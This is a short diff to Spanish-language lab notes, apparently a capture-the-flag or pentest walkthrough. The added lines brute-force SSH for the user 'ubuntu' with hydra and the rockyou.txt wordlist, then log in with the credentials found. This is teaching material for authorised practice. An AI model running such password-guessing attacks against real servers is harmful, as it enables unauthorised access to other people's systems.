@@ -9,4 +9,8 @@
 ---- Refrescar la página
 ---- /
 ---- A la derecha ubicar información de relevancia
-++ Mediante hydra hydra -l ubuntu 
+++ Mediante hydra procederemos a intentar el acceso ssh usando credenciales por defecto de ubuntu
+++ hydra -l ubuntu -P rockyou.txt ssh://<ip_servidor>
+++ Las credenciales del usuario ubuntu han sido encontradas
+++ Ingresamos las mismas usando:
+++ ssh <usuario@<ip_servidor>
